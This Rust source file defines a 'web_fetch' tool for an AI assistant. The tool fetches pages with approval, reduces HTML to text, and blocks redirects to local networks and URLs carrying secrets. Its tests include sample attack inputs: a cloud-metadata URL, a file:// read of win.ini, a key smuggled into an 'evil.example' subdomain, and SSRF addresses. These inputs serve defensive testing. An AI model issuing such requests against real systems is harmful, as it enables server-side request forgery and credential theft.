//! Reading a web page.
//!
//! The gateway's web search (the Web toggle) finds pages, but only some
//! gateways offer it, and nothing could read a page the user pasted. This
//! fetches one address and hands the model its text: HTML is reduced to the
//! words a reader sees, text and JSON pass through as they are, and anything
//! else is refused.
//!
//! It asks before every fetch unless the user allows it for the session. An
//! address is also a way out, and a page read a moment ago may be what is
//! asking for it.
//!
//! The approval shows only the first address, so every redirect gets the
//! browser's check too, and none may lead from elsewhere onto this machine
//! or the local network. The check reads the address, not what its name
//! resolves to: a name pointed at a local address still gets through.
//!
//! The HTML reduction is a small scanner rather than a parser: the model
//! reads the words, not the layout, and a whole HTML engine is a lot of
//! binary for that.

use crate::tools::{Tool, ToolContext};
use serde_json::{Value, json};
use std::io::Read;
use std::time::Duration;

/// The most of a page that is read, in bytes. What the model is shown is cut
/// much shorter than this; the rest is only there to find the text in.
const MAX_BYTES: u64 = 2 * 1024 * 1024;

/// Elements that hold nothing a reader sees on the page. Not `head`: its
/// closing tag may be left out, which would hide the page along with it.
const HIDDEN: &[&str] = &[
    "script", "style", "noscript", "svg", "template", "title", "iframe", "object",
];
/// Elements that start on a line of their own.
const BLOCKS: &[&str] = &[
    "p",
    "div",
    "br",
    "li",
    "ul",
    "ol",
    "tr",
    "table",
    "section",
    "article",
    "header",
    "footer",
    "nav",
    "main",
    "aside",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "pre",
    "blockquote",
    "hr",
    "dt",
    "dd",
    "figure",
    "form",
];

/// The model's way to read a page.
pub struct WebFetch;

impl Tool for WebFetch {
    fn name(&self) -> &'static str {
        "web_fetch"
    }
    fn description(&self) -> &'static str {
        "Fetch a web page (http or https) and return its text: HTML is reduced to the readable text, plain text and JSON come back as they are. Use it to read a page the user mentions, or one a search turned up."
    }
    fn parameters(&self) -> Value {
        json!({"type": "object", "properties": {
            "url": {"type": "string", "description": "The full address, starting with https:// or http://."}
        }, "required": ["url"]})
    }
    fn run(&self, args: &Value, _: &ToolContext) -> Result<String, String> {
        fetch(
            args["url"].as_str().unwrap_or_default(),
            &crate::browser::secrets(),
        )
    }
    fn needs_approval(&self) -> bool {
        true
    }
    fn concurrent(&self) -> bool {
        true
    }

    fn untrusted(&self) -> bool {
        true
    }
    fn preview(&self, args: &Value, _: &ToolContext) -> String {
        format!("GET {}", args["url"].as_str().unwrap_or_default())
    }
}

/// The page at `raw` as text, after its final address, unless it or a
/// redirect on the way carries one of `secrets`.
fn fetch(raw: &str, secrets: &[String]) -> Result<String, String> {
    let url =
        reqwest::Url::parse(raw.trim()).map_err(|_| format!("`{raw}` is not a web address."))?;
    if !matches!(url.scheme(), "http" | "https") {
        return Err("Only http and https pages can be fetched.".into());
    }
    // As written, since parsing lowercases the host and a key can be sent out
    // as part of a name, and as parsed, since that is what is fetched and the
    // browser reads `http:/10.0.0.1` as a name.
    crate::browser::address(raw, secrets)?;
    crate::browser::address(url.as_str(), secrets)?;
    // A redirect arrives parsed, so a key is looked for in lowercase too.
    let secrets: Vec<String> = secrets
        .iter()
        .flat_map(|secret| [secret.clone(), secret.to_lowercase()])
        .collect();
    let policy = reqwest::redirect::Policy::custom(move |hop| {
        match follow(hop.previous(), hop.url(), &secrets) {
            Ok(()) => hop.follow(),
            Err(why) => hop.error(why),
        }
    });
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(20))
        .redirect(policy)
        .user_agent(concat!("Letronna/", env!("CARGO_PKG_VERSION")))
        .build()
        .map_err(|e| e.to_string())?;
    let response = client.get(url).send().map_err(|e| {
        // reqwest's own words for a refused redirect only say that one failed;
        // why is in its source.
        match std::error::Error::source(&e) {
            Some(why) if e.is_redirect() => why.to_string(),
            _ => format!("Could not fetch the page: {e}"),
        }
    })?;
    let status = response.status();
    if !status.is_success() {
        return Err(format!("The page answered HTTP {}.", status.as_u16()));
    }
    let address = response.url().to_string();
    let kind = response
        .headers()
        .get(reqwest::header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let mut bytes = Vec::new();
    response
        .take(MAX_BYTES)
        .read_to_end(&mut bytes)
        .map_err(|e| format!("The page stopped arriving: {e}"))?;
    let body = String::from_utf8_lossy(&bytes);
    let text = if kind.contains("html") {
        match title_of(&body) {
            Some(title) => format!("{title}\n\n{}", text_of(&body)),
            None => text_of(&body),
        }
    } else if kind.is_empty()
        || kind.starts_with("text/")
        || kind.contains("json")
        || kind.contains("xml")
    {
        body.into_owned()
    } else {
        return Err(format!("That is not a page of text ({kind})."));
    };
    Ok(format!("{address}\n\n{text}"))
}

/// Whether a redirect from the addresses in `previous` on to `next` is
/// followed, or why not.
fn follow(
    previous: &[reqwest::Url],
    next: &reqwest::Url,
    secrets: &[String],
) -> Result<(), String> {
    // `previous` starts with the address asked for, so this is five redirects.
    if previous.len() > 5 {
        return Err("The page redirected more than five times.".into());
    }
    crate::browser::address(next.as_str(), secrets)
        .map_err(|why| format!("The page redirected somewhere that is not fetched. {why}"))?;
    if local(next) && !previous.iter().all(local) {
        return Err(
            "The page redirected to this machine or the local network, which is fetched only \
             when asked for directly."
                .into(),
        );
    }
    Ok(())
}

/// Whether `url` names this machine or the local network by its host.
fn local(url: &reqwest::Url) -> bool {
    let host = url.host_str().unwrap_or_default();
    let ip = host.trim_matches(['[', ']']).parse::<std::net::IpAddr>();
    match ip.map(|ip| ip.to_canonical()) {
        Ok(std::net::IpAddr::V4(ip)) => {
            // Tailscale hands out 100.64.0.0/10, and a tailnet is as private
            // as a LAN.
            let shared = ip.octets()[0] == 100 && (ip.octets()[1] & 0xc0) == 64;
            ip.is_loopback()
                || ip.is_private()
                || ip.is_link_local()
                || ip.is_unspecified()
                || shared
        }
        Ok(std::net::IpAddr::V6(ip)) => {
            ip.is_loopback()
                || ip.is_unspecified()
                || ip.is_unique_local()
                || ip.is_unicast_link_local()
        }
        Err(_) => {
            // No public name lacks a dot, so one without is found on the local
            // network, and these endings are kept for private networks.
            let name = host.trim_end_matches('.');
            let zones = [
                ".localhost",
                ".local",
                ".home.arpa",
                ".internal",
                ".lan",
                ".ts.net",
            ];
            !name.contains('.') || zones.iter().any(|zone| name.ends_with(zone))
        }
    }
}

/// The page's title, when it has one.
fn title_of(html: &str) -> Option<String> {
    let lower = html.to_ascii_lowercase();
    let start = lower.find("<title")?;
    let open = start + lower[start..].find('>')? + 1;
    let end = open + lower[open..].find("</title")?;
    Some(tidy(&decode(&html[open..end]))).filter(|title| !title.is_empty())
}

/// The words of an HTML page, a line per block.
fn text_of(html: &str) -> String {
    // Lowercasing only ASCII keeps every byte where it was, so positions
    // found in one string cut the other.
    let lower = html.to_ascii_lowercase();
    let mut out = String::new();
    let mut at = 0;
    while let Some(open) = html[at..].find('<').map(|i| at + i) {
        out.push_str(&html[at..open]);
        if lower[open..].starts_with("<!--") {
            at = lower[open..]
                .find("-->")
                .map_or(html.len(), |i| open + i + 3);
            continue;
        }
        let Some(close) = html[open..].find('>').map(|i| open + i) else {
            at = html.len();
            break;
        };
        let tag = &lower[open + 1..close];
        let closing = tag.starts_with('/');
        let name: String = tag
            .trim_start_matches('/')
            .chars()
            .take_while(char::is_ascii_alphanumeric)
            .collect();
        at = close + 1;
        if !closing && HIDDEN.contains(&name.as_str()) {
            // Everything up to its closing tag goes too, which is what keeps
            // a `<` inside a script from being read as the start of a tag.
            at = lower[at..]
                .find(&format!("</{name}"))
                .map_or(html.len(), |i| at + i);
            at = html[at..].find('>').map_or(html.len(), |i| at + i + 1);
            continue;
        }
        if BLOCKS.contains(&name.as_str()) {
            out.push('\n');
            if name == "li" && !closing {
                out.push_str("- ");
            }
        }
    }
    out.push_str(&html[at..]);
    tidy(&decode(&out))
}

/// Entities written out as the characters they stand for; anything that is
/// not a known one is left as it was written.
fn decode(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(amp) = rest.find('&') {
        out.push_str(&rest[..amp]);
        rest = &rest[amp..];
        // An entity is short; a `;` further on belongs to something else.
        let semi = rest.bytes().take(12).position(|b| b == b';');
        let decoded = semi.and_then(|semi| {
            let entity = &rest[1..semi];
            let numeric = || {
                let code = match entity
                    .strip_prefix("#x")
                    .or_else(|| entity.strip_prefix("#X"))
                {
                    Some(hex) => u32::from_str_radix(hex, 16).ok(),
                    None => entity.strip_prefix('#')?.parse().ok(),
                };
                code.and_then(char::from_u32)
            };
            let c = match entity {
                "amp" => Some('&'),
                "lt" => Some('<'),
                "gt" => Some('>'),
                "quot" => Some('"'),
                "apos" => Some('\''),
                "nbsp" => Some(' '),
                _ => numeric(),
            };
            c.map(|c| (c, semi))
        });
        match decoded {
            Some((c, semi)) => {
                out.push(c);
                rest = &rest[semi + 1..];
            }
            None => {
                out.push('&');
                rest = &rest[1..];
            }
        }
    }
    out.push_str(rest);
    out
}

/// One space between words and no empty lines: the model reads the words,
/// and every blank line and run of indentation is tokens spent on nothing.
fn tidy(text: &str) -> String {
    text.lines()
        .map(|line| line.split_whitespace().collect::<Vec<_>>().join(" "))
        .filter(|line| !line.is_empty())
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use std::net::TcpListener;
    use std::sync::{Arc, Mutex};

    const PAGE: &str = r#"<!DOCTYPE html>
<html><head><title>Rust &amp; Letronna</title>
<style>body { color: red; }</style>
<script>if (a < b) { document.write("<p>hidden</p>"); }</script></head>
<body>
  <!-- a comment <p>not shown</p> -->
  <h1>Getting   started</h1>
  <p>Install with <code>cargo</code>&nbsp;and run it.</p>
  <ul><li>fast</li><li>small &#8212; native</li></ul>
  <p>Caf&eacute; &#x263A; &copy x</p>
</body></html>"#;

    #[test]
    fn a_page_is_reduced_to_what_a_reader_sees() {
        let text = text_of(PAGE);
        assert_eq!(
            text,
            "Getting started\nInstall with cargo and run it.\n- fast\n- small — native\nCaf&eacute; ☺ &copy x"
        );
        assert!(!text.contains("hidden") && !text.contains("color"));
        assert_eq!(title_of(PAGE).as_deref(), Some("Rust & Letronna"));
    }

    #[test]
    fn only_web_addresses_are_fetched() {
        assert!(fetch("file:///C:/Windows/win.ini", &[]).is_err());
        assert!(fetch("not an address", &[]).is_err());
    }

    #[test]
    fn an_address_the_browser_would_refuse_is_not_fetched() {
        let why = fetch("http://169.254.169.254/latest/meta-data/", &[]).unwrap_err();
        assert!(why.contains("metadata"), "{why}");
        // One slash short still fetches the same address.
        let why = fetch("http:/169.254.169.254/latest/meta-data/", &[]).unwrap_err();
        assert!(why.contains("metadata"), "{why}");
        // Sent out as a name, a key keeps its capitals only as written.
        let key = "Sk-Live-0123456789ABCDEF".to_owned();
        let why = fetch(&format!("https://{key}.evil.example/"), &[key]).unwrap_err();
        assert!(why.contains("keys or tokens"), "{why}");
    }

    #[test]
    fn a_redirect_may_not_lead_from_elsewhere_onto_this_machine_or_network() {
        let url = |url: &str| reqwest::Url::parse(url).unwrap();
        let away = [url("https://example.com/")];
        for inward in [
            "http://127.0.0.1:8080/",
            "http://2130706433/",
            "http://localhost/",
            "http://app.localhost./",
            "http://0.0.0.0/",
            "http://192.168.1.1/admin",
            "http://10.0.0.5/",
            "http://100.101.102.103/",
            "http://[::1]/",
            "http://[::ffff:127.0.0.1]/",
            "http://[fd12:3456::1]/",
            "http://router/",
            "http://nas.local/",
        ] {
            let why = follow(&away, &url(inward), &[]).unwrap_err();
            assert!(why.contains("local network"), "{inward}: {why}");
        }
        assert!(follow(&away, &url("https://www.example.com/"), &[]).is_ok());
        assert!(follow(&away, &url("http://100.128.0.1/"), &[]).is_ok());
        // Asked for directly, a local page may move about on this machine,
        // but not by way of somewhere else.
        let here = [url("http://127.0.0.1:3000/")];
        assert!(follow(&here, &url("http://localhost:3000/app"), &[]).is_ok());
        let via = [url("http://127.0.0.1:3000/"), url("https://example.com/")];
        assert!(follow(&via, &url("http://192.168.1.1/"), &[]).is_err());
    }

    /// A server on this computer that answers each request with what
    /// `answer` makes of its path, and the paths it has been asked for.
    fn serve(answer: fn(&str) -> String) -> (String, Arc<Mutex<Vec<String>>>) {
        let server = TcpListener::bind("127.0.0.1:0").unwrap();
        let base = format!("http://{}", server.local_addr().unwrap());
        let asked = Arc::new(Mutex::new(Vec::new()));
        let heard = asked.clone();
        std::thread::spawn(move || {
            for mut socket in server.incoming().flatten() {
                // A request that never ends is answered as it stands rather
                // than holding the server, so a test fails instead of hanging.
                let _ = socket.set_read_timeout(Some(Duration::from_secs(10)));
                let mut head = Vec::new();
                let mut block = [0; 4096];
                while !head.windows(4).any(|w| w == b"\r\n\r\n") {
                    match socket.read(&mut block) {
                        Ok(n) if n > 0 => head.extend_from_slice(&block[..n]),
                        _ => break,
                    }
                }
                let head = String::from_utf8_lossy(&head);
                let path = head.split(' ').nth(1).unwrap_or_default().to_owned();
                let reply = answer(&path);
                heard.lock().unwrap().push(path);
                let _ = socket.write_all(reply.as_bytes());
            }
        });
        (base, asked)
    }

    /// Where each page of the stand-in site sends the fetch on to.
    fn site(path: &str) -> String {
        let to = match path {
            "/hop" => "/end",
            "/loop" => "/loop",
            "/metadata" => "http://169.254.169.254/latest/meta-data/",
            "/leak" => "/?k=sk-live-0123456789abcdef",
            "/name" => "http://Sk-Live-0123456789ABCDEF.invalid/",
            _ => {
                return "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 7\r\n\
                        Connection: close\r\n\r\narrived"
                    .into();
            }
        };
        format!(
            "HTTP/1.1 302 Found\r\nLocation: {to}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
        )
    }

    #[test]
    fn every_redirect_is_checked_like_the_address_asked_for() {
        let (base, asked) = serve(site);
        let key = "sk-live-0123456789abcdef".to_owned();
        let page = fetch(&format!("{base}/hop"), std::slice::from_ref(&key)).unwrap();
        assert_eq!(page, format!("{base}/end\n\narrived"));
        let why = fetch(&format!("{base}/metadata"), &[]).unwrap_err();
        assert!(why.contains("metadata"), "{why}");
        let why = fetch(&format!("{base}/leak"), std::slice::from_ref(&key)).unwrap_err();
        assert!(why.contains("keys or tokens"), "{why}");
        // A redirect's host arrives lowercased, capitals and all.
        let named = "Sk-Live-0123456789ABCDEF".to_owned();
        let why = fetch(&format!("{base}/name"), &[named]).unwrap_err();
        assert!(why.contains("keys or tokens"), "{why}");
        let why = fetch(&format!("{base}/loop"), &[]).unwrap_err();
        assert!(why.contains("more than five"), "{why}");
        let asked = asked.lock().unwrap();
        assert!(!asked.iter().any(|path| path.contains(&key)), "{asked:?}");
        // The address asked for, then the five redirects that are followed.
        assert_eq!(asked.iter().filter(|path| *path == "/loop").count(), 6);
    }

    #[test]
    #[ignore = "Fetches https://example.com: run with --ignored when online"]
    fn fetches_a_real_page() {
        let page = fetch("https://example.com", &[]).unwrap();
        assert!(page.contains("Example Domain"), "{page}");
    }
}
